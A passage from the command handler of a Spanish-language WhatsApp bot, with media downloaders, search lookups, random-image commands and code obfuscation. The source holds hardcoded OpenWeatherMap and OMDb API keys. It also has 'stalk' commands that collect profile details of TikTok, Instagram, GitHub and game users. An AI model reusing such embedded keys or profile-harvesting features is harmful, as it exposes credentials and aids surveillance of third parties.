case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
SenseiOfc_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await SenseiOfc.sendMessage(m.chat, { audio: SenseiOfc_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'friend':
case 'amigo':
case 'amigosecreto':
case 'buscaramigo': {
  await StickWait()
  let teman = pickRandom(verifieduser)
  setTimeout(() => {}, 1000)
  setTimeout(() => {
    replygc('Conseguí a una persona')
  }, 5000)
  setTimeout(() => {
    SenseiOfc.sendMessage(from, {text: `Aquí @${teman.split("@")[0]}`, mentions: [teman]}, { quoted: m })
  }, 9000)
}
break
case 'q':
case 'quoted': {
    if (!m.quoted) return replygc('¡Responde al mensaje!')
    let xeonquotx = await SenseiOfc.serializeM(await m.getQuotedObj())
    if (!xeonquotx.quoted) return replygc('El mensaje al que estás respondiendo no fue enviado por el bot')
    await xeonquotx.quoted.copyNForward(m.chat, true)
}
break
case 'obfus':
case 'obfuscate': {
    if (!q) return replygc(`Ejemplo: ${prefix + command} const xeonbot = require('baileys')`)
    let meg = await obfus(q)
    replygc(`Éxito\n${meg.result}`)
}
break
case 'style': case 'styletext': {
  let { styletext } = require('./lib/scraper')
  if (!text) return replygc('Ingresa el texto a consultar')
  let anu = await styletext(text)
  let teks = `Estilo de texto de ${text}\n\n`
  for (let i of anu) {
    teks += `${themeemoji} *${i.name}* : ${i.result}\n\n`
  }
  replygc(teks)
}
break
case 'yts': case 'playlist': case 'ytsearch': {
  if (!text) return replygc(`Ejemplo : ${prefix + command} historia wa anime`)
  let yts = require("yt-search")
  let search = await yts(text)
  let teks = 'Búsqueda en YouTube\n\n Resultado de ' + text + '\n\n'
  let no = 1
  for (let i of search.all) {
    teks += `🌟 *N° :* ${no++}\n🎞️ *Tipo :* ${i.type}\n🆔 *ID del video :* ${i.videoId}\n📜 *Título :* ${i.title}\n👁️‍🗨️ *Vistas :* ${i.views}\n⏱️ *Duración :* ${i.timestamp}\n📅 *Subido :* ${i.ago}\n🔗 *Url :* ${i.url}\n━━━━━━━━━━━━━━\n\n`
  }
  SenseiOfc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail }, caption: teks }, { quoted: m })
}
break
case 'play': case 'song': {
  if (!text) return replygc(`Ejemplo : ${prefix + command} anime estado de whatsapp`)
  const xeonplaymp3 = require('./lib/ytdl')
  let yts = require("youtube-yts")
  let search = await yts(text)
  let anup3k = search.videos[0]
  const pl = await xeonplaymp3.mp3(anup3k.url)
  await SenseiOfc.sendMessage(m.chat, {
    audio: fs.readFileSync(pl.path),
    fileName: anup3k.title + '.mp3',
    mimetype: 'audio/mp4', ptt: false,
    contextInfo: {
      externalAdReply: {
        title: anup3k.title,
        body: botname,
        thumbnail: await fetchBuffer(pl.meta.image),
        sourceUrl: websitex,
        mediaType: 2,
        mediaUrl: anup3k.url,
      }
    },
  }, { quoted: m })
  await fs.unlinkSync(pl.path)
}
break
case 'play2':
  if (!text) return replygc(`Ejemplo : ${prefix + command} anime estado de whatsapp`)
  let yts = require("yt-search")
  let xeonytdl = require('./lib/ytdl')
  
  try {
    let search = await yts(text)
    let anup4k = search.videos[0]
    
    if (!anup4k) return replygc('No se encontraron resultados para la búsqueda.')

    const vid = await xeonytdl.mp4(anup4k.url)
    
    const ytc = `
    *${themeemoji}Título:* ${vid.title}
    *${themeemoji}Fecha:* ${vid.date}
    *${themeemoji}Duración:* ${vid.duration}
    *${themeemoji}Calidad:* ${vid.quality}`
    
    await SenseiOfc.sendMessage(m.chat, {
      video: { url: vid.videoUrl },
      caption: ytc
    }, { quoted: m })
    
    await fs.unlinkSync(vid.path)
  } catch (error) {
    console.error(error);
  }
  break
case 'ytmp3': case 'ytaudio': {
  let xeonaudp3 = require('./lib/ytdl')
  if (args.length < 1 || !isUrl(text) || !xeonaudp3.isYTUrl(text)) return replygc(`¿Dónde está el enlace de YouTube?\nEjemplo: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`)
  let audio = await xeonaudp3.mp3(text)
  await SenseiOfc.sendMessage(m.chat, {
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: false,
    contextInfo: {
      externalAdReply: {
        title: audio.meta.title,
        body: botname,
        thumbnail: await fetchBuffer(audio.meta.image),
        mediaType: 2,
        mediaUrl: text,
      }
    },
  }, { quoted: m })
  await fs.unlinkSync(audio.path)
}
break
case 'ytmp4': case 'ytvideo': {
  const xeonvidoh = require('./lib/ytdl')
  if (args.length < 1 || !isUrl(text) || !xeonvidoh.isYTUrl(text)) replygc(`¿Dónde está el enlace?\n\nEjemplo: ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
  const vid = await xeonvidoh.mp4(text)
  const ytc = `
*${themeemoji}Título:* ${vid.title}
*${themeemoji}Fecha:* ${vid.date}
*${themeemoji}Duración:* ${vid.duration}
*${themeemoji}Calidad:* ${vid.quality}`
  await SenseiOfc.sendMessage(m.chat, {
    video: { url: vid.videoUrl },
    caption: ytc
  }, { quoted: m })
}
break
case 'git':
case 'gitclone':
  if (!args[0]) return replygc(`¿Dónde está el enlace?\nEjemplo:\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
  if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygc(`¡Enlace inválido!`)
  let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
  let [, user, repo] = args[0].match(regex1) || []
  repo = repo.replace(/.git$/, '')
  let url = `https://api.github.com/repos/${user}/${repo}/zipball`
  let filename = (await fetch(url, { method: 'HEAD' })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
  SenseiOfc.sendMessage(m.chat, { document: { url: url }, fileName: filename + '.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygc(mess.error))
  break
case 'tiktok':
  if (!q) return replygc(`Ejemplo: ${prefix + command} enlace`)
  if (!q.includes('tiktok')) return replygc(`¡Enlace inválido!`)
  require('./lib/tiktok').Tiktok(q).then(data => {
    SenseiOfc.sendMessage(m.chat, { caption: `¡Aquí lo tienes!`, video: { url: data.watermark } }, { quoted: m })
  })
  break
case 'tiktokaudio':
  if (!q) return replygc(`Ejemplo: ${prefix + command} enlace`)
  if (!q.includes('tiktok')) return replygc(`¡Enlace inválido!`)
  require('./lib/tiktok').Tiktok(q).then(data => {
    const xeontikmp3 = { url: data.audio }
    SenseiOfc.sendMessage(m.chat, { audio: xeontikmp3, mimetype: 'audio/mp4', ptt: false }, { quoted: m })
  })
  break
case 'google':
  if (!q) return replygc(`Ejemplo: ${prefix + command} ${botname}`)
  await StickWait()
  let google = require('google-it')
  let texto = q.split(' ').join('+')
  let urlGoogle = `https://www.google.com/search?q=${texto}`
  let krt = await scp2.ssweb(urlGoogle)
  google({ 'query': text }).then(res => {
    let teks = `Búsqueda en Google de: ${text}\n\n`
    for (let g of res) {
      teks += `⭔ *Título* : ${g.title}\n`
      teks += `⭔ *Descripción* : ${g.snippet}\n`
      teks += `⭔ *Enlace* : ${g.link}\n\n────────────────────────\n\n`
    }
    SenseiOfc.sendMessage(from,{image:krt.result,caption:teks}, {quoted:m})
  })
  break
case 'weather': case 'clima':
  if (!text) return replygc('¿Cuál es la ubicación?')
  let wdata = await axios.get(
    `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=es`
  )
  let textw = `🌎 **Clima en ${text}**\n\n`
  textw += `🌦️ *Clima:* ${await translateToSpanish(wdata.data.weather[0].main)}\n`
  textw += `📝 *Descripción:* ${await translateToSpanish(wdata.data.weather[0].description)}\n`
  textw += `🌡️ *Temperatura Promedio:* ${wdata.data.main.temp} °C\n`
  textw += `🌡️ *Sensación Térmica:* ${wdata.data.main.feels_like} °C\n`
  textw += `🛰️ *Presión:* ${wdata.data.main.pressure} hPa\n`
  textw += `💧 *Humedad:* ${wdata.data.main.humidity}%\n`
  textw += `🌬️ *Velocidad del Viento:* ${wdata.data.wind.speed} m/s\n`
  textw += `📍 *Latitud:* ${wdata.data.coord.lat}\n`
  textw += `📍 *Longitud:* ${wdata.data.coord.lon}\n`
  textw += `🌐 *País:* ${wdata.data.sys.country}\n`

  SenseiOfc.sendMessage(
    m.chat, {
      text: textw,
      footerText: `Información proporcionada por OpenWeatherMap`,
      footerIcon: 'https://openweathermap.org/themes/openweathermap/assets/img/logo_white_cropped.png',
    }, {
      quoted: m,
    }
  )
  break
  case 'fb': case 'facebook': {
  if (!args[0]) {
    return replygc(`Por favor, envía el enlace de un video de Facebook\n\nEJEMPLO:\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return replygc('Enlace no válido')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        [ DESCARGA DE FACEBOOK ]
${themeemoji} Título: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    SenseiOfc.sendMessage(m.chat, { video: videoBuffer, caption: tex }, { quoted: m })
  } catch (error) {
    replygc('¡Quizás sea un video privado!')
  }
}
break
case 'tiktokstalk': {
  if (!text) return replygc(`¿Nombre de usuario?`)
  let res = await fg.ttStalk(args[0])
  let txt = `
┌──「 *STALK DE TIKTOK* 
▢ *🔖Número:* ${res.name}
▢ *🔖Nombre de Usuario:* ${res.username}
▢ *👥Seguidores:* ${res.followers}
▢ *🫂Siguiendo:* ${res.following}
▢ *📌Descripción:* ${res.desc}

▢ *🔗 Enlace* : https://tiktok.com/${res.username}
└────────────`
  await SenseiOfc.sendMessage(m.chat, { image: { url: res.profile }, caption: txt }, { quoted: m })
}
break

case 'igstalk': {
  if (!args[0]) return replygc(`Ingresa el nombre de usuario de Instagram\n\nEjemplo: ${prefix + command} unicorn_xeon13`)
  const fg = require('api-dylux')
  try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING DE INSTAGRAM* 
▢ *🔖Nombre:* ${res.name} 
▢ *🔖Nombre de Usuario:* ${res.username}
▢ *👥Seguidores:* ${res.followersH}
▢ *🫂Siguiendo:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Publicaciones:* ${res.postsH}
▢ *🔗 Enlace* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
    await SenseiOfc.sendMessage(m.chat, { image: { url: res.profilePic }, caption: te }, { quoted: m })
  } catch {
    replygc(`Asegúrate de que el nombre de usuario sea de *Instagram*`)
  }
}
break
case 'ghstalk':
case 'githubstalk': {
  if (!q) return replygc(`Ejemplo: ${prefix + command} DGXeon`)
  await StickWait()
  let githubstalk = require('./lib/scraper')
  aj = await githubstalk.githubstalk(`${q}`)
  let txt = `
┌──「 *GITHUB STALK* 
▢ *🔖Usuario:* ${aj.username}
▢ *🔖Apodo:* ${aj.nickname}
▢ *📝Biografía:* ${aj.bio}
▢ *🆔ID:* ${aj.id}
▢ *🆔NodeID:* ${aj.nodeId}
▢ *🌐URL del Perfil:* ${aj.profile_pic}
▢ *🌐URL de GitHub:* ${aj.url}
▢ *🔶Tipo:* ${aj.type}
▢ *👥Admin:* ${aj.admin}
▢ *🏢Empresa:* ${aj.company}
▢ *📝Blog:* ${aj.blog}
▢ *📍Ubicación:* ${aj.location}
▢ *📧Correo Electrónico:* ${aj.email}
▢ *📚Repositorios Públicos:* ${aj.public_repo}
▢ *📘Gists Públicos:* ${aj.public_gists}
▢ *👥Seguidores:* ${aj.followers}
▢ *👤Siguiendo:* ${aj.following}
▢ *🕒Creado en:* ${aj.ceated_at}
▢ *🕒Actualizado en:* ${aj.updated_at}
└────────────`
  SenseiOfc.sendMessage(m.chat, { image: { url: aj.profile_pic }, caption: txt }, { quoted: m })
}
break
case 'npmstalk': {
  if (!q) return replygc(`Ejemplo: ${prefix + command} xeonapi`)
  await StickWait()
  let npmstalk = require('./lib/scraper')
  eha = await npmstalk.npmstalk(q)
  let txt = `
┌──「 *NPM STALK* 
▢ *🔖Nombre:* ${eha.name}
▢ *🔖Última Versión:* ${eha.versionLatest}
▢ *📝Versión Publicada:* ${eha.versionPublish}
▢ *📝Versión Actualizada:* ${eha.versionUpdate}
▢ *📚Últimas Dependencias:* ${eha.latestDependencies}
▢ *📚Dependencias Publicadas:* ${eha.publishDependencies}
▢ *🕒Tiempo de Publicación:* ${eha.publishTime}
▢ *🕒Último Tiempo de Publicación:* ${eha.latestPublishTime}
└────────────`
  replygc(txt)
}
break
case 'ffstalk': {
  if (!q) return replygc(`Ejemplo: ${prefix + command} 946716486`)
  await StickWait()
  let ffstalk = require('./lib/scraper')
  eeh = await ffstalk.ffstalk(`${q}`)
  let txt = `
┌──「 *FREE FIRE STALK* 
▢ *🆔ID:* ${eeh.id}
▢ *🔖Nickname:* ${eeh.nickname}
└────────────`
  replygc(txt)
}
break
case 'mlstalk': {
  if (!q) return replygc(`Ejemplo: ${prefix + command} 530793138|8129`)
  await StickWait()
  let mlstalk = require('./lib/scraper')
  let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
  let txt = `
┌──「 *MOBILE LEGENDS STALK* 
▢ *🔖Username:* ${dat.userName}
▢ *🆔ID:* ${q.split("|")[0]}
▢ *📡ID Zone:* ${q.split("|")[1]}
└────────────`
  replygc(txt)
}
break
case 'spotify': {
  if (!text) return replygc(`*Por favor, ingresa el nombre de una canción*`)
  try {
    const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
    const response = await fetch(apiUrl);
    if (!response.ok) {
        console.log('Error searching for song:', response.statusText)
        return replygc('Error searching for song')
    }
    const data = await response.json()
    const coverimage = data.spty.results.thumbnail
    const name = data.spty.results.title
    const slink = data.spty.results.url
    const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
    const audioResponse = await fetch(dlapi)
    if (!audioResponse.ok) {
        console.log('Error fetching audio:', audioResponse.statusText)
        return replygc('Error fetching audio')
    }
    const audioBuffer = await audioResponse.buffer()
    const tempDir = os.tmpdir()
    const audioFilePath = path.join(tempDir, 'audio.mp3')
    try {
        await fs.promises.writeFile(audioFilePath, audioBuffer)
    } catch (writeError) {
        console.error('Error writing audio file:', writeError)
        return replygc( 'Error writing audio file')
    }
    let doc = {
        audio: {
          url: audioFilePath
        },
        mimetype: 'audio/mpeg',
        ptt: true,
        waveform:  [100, 0, 100, 0, 100, 0, 100],
        fileName: "dgxeon",
        contextInfo: {
          mentionedJid: [m.sender],
          externalAdReply: {
            title: `REPRODUCIENDO ${name}`,
            body: botname,
            thumbnailUrl: coverimage,
            sourceUrl: websitex,
            mediaType: 1,
            renderLargerThumbnail: true
          }
        }
    }        
    await SenseiOfc.sendMessage(m.chat, doc, { quoted: m })
  } catch (error) {
      console.error('Error fetching Spotify data:', error)
      return replygc('*Error*')
  }
}
break
case 'imdb':
    if (!text) return replygc(`_Nombre de una serie o película_`)
    await StickWait()
    let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
    let imdbt = ""
    console.log(fids.data)
    imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` BÚSQUEDA EN IMDB```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
    imdbt += "🎬Título      : " + fids.data.Title + "\n"
    imdbt += "📅Año         : " + fids.data.Year + "\n"
    imdbt += "⭐Clasificación: " + fids.data.Rated + "\n"
    imdbt += "📆Lanzamiento : " + fids.data.Released + "\n"
    imdbt += "⏳Duración     : " + fids.data.Runtime + "\n"
    imdbt += "🌀Género       : " + fids.data.Genre + "\n"
    imdbt += "👨🏻‍💻Director  : " + fids.data.Director + "\n"
    imdbt += "✍Escritor     : " + fids.data.Writer + "\n"
    imdbt += "👨Actores      : " + fids.data.Actors + "\n"
    imdbt += "📃Trama        : " + fids.data.Plot + "\n"
    imdbt += "🌐Idioma       : " + fids.data.Language + "\n"
    imdbt += "🌍País         : " + fids.data.Country + "\n"
    imdbt += "🎖️Premios      : " + fids.data.Awards + "\n"
    imdbt += "📦Taquilla     : " + fids.data.BoxOffice + "\n"
    imdbt += "🏙️Producción   : " + fids.data.Production + "\n"
    imdbt += "🌟imdbRating   : " + fids.data.imdbRating + "\n"
    imdbt += "✅imdbVotes    : " + fids.data.imdbVotes + ""
    SenseiOfc.sendMessage(m.chat, {
        image: {
            url: fids.data.Poster,
        },
        caption: imdbt,
    }, {
        quoted: m,
    })
    break
case 'ebinary': {
    if (!q) return replygc(`Envía o responde un texto con la leyenda ${prefix + command}`)
    let { eBinary } = require('./lib/binary')
    let eb = await eBinary(`${q}`)
    replygc(eb)
}
break
case 'dbinary': {
    if (!q) return replygc(`Envía o responde un texto con la leyenda ${prefix + command}`)
    let { dBinary } = require('./lib/binary')
    let db = await dBinary(`${q}`)
    replygc(db)
}
break
case 'happymod':{
    if (!q) return replygc(`Ejemplo ${prefix+command} Subway surfer mod`)
    await StickWait()
    let kat = await scp2.happymod(q)
    replygc(util.format(kat))
}
break
case 'gdrive': {
    if (!args[0]) return replygc(`Ingresa el enlace de Google Drive`)
    await StickWait()
    const fg = require('api-dylux')
    try {
        let res = await fg.GDriveDl(args[0])
        await replygc(`
≡ *Descarga desde Google Drive*
▢ *Nombre:* ${res.fileName}
▢ *Tamaño:* ${res.fileSize}
▢ *Tipo:* ${res.mimetype}`)
        SenseiOfc.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
    } catch {
        replygc('Error: Verifica el enlace o intenta con otro enlace')
    }
}
break

case 'pinterest': {
    if (!text) return replygc(`Ingresa la consulta`)
    let { pinterest } = require('./lib/scraper')
    anutrest = await pinterest(text)
    result = anutrest[Math.floor(Math.random() * anutrest.length)]
    SenseiOfc.sendMessage(m.chat, { image: { url: result }, caption: '⭔ URL Multimedia : ' + result }, { quoted: m })
}
break
case 'ringtone': {
    if (!text) return replygc(`Ejemplo : ${prefix + command} black rover`)
    let ringtone = require('./lib/scraper')
    let anutone2 = await ringtone(text)
    let result = anutone2[Math.floor(Math.random() * anutone2.length)]
    SenseiOfc.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
}
break
case 'tiktokgirl':
await StickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await StickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await StickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await StickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await StickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await StickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await StickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
SenseiOfc.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
SenseiOfc.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await StickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
SenseiOfc.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'remini': case 'hd': {
    if (!quoted) return replygc(`¿Dónde está la imagen?`)
    if (!/image/.test(mime)) return replygc(`Envía/Responde con fotos y subtítulos ${prefix + command}`)
    await StickWait()
    const { remini } = require('./lib/remini')
    let media = await quoted.download()
    let proses = await remini(media, "enhance")
    SenseiOfc.sendMessage(m.chat, { image: proses, caption: mess.success }, { quoted: m })
}
break
			case 'define':
    if (!q) return replygc(`¿Qué quieres definir?`)
    try {
        targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
        if (!targetfine) return replygc(mess.error)
        const reply = `
*${themeemoji} Palabra:* ${q}
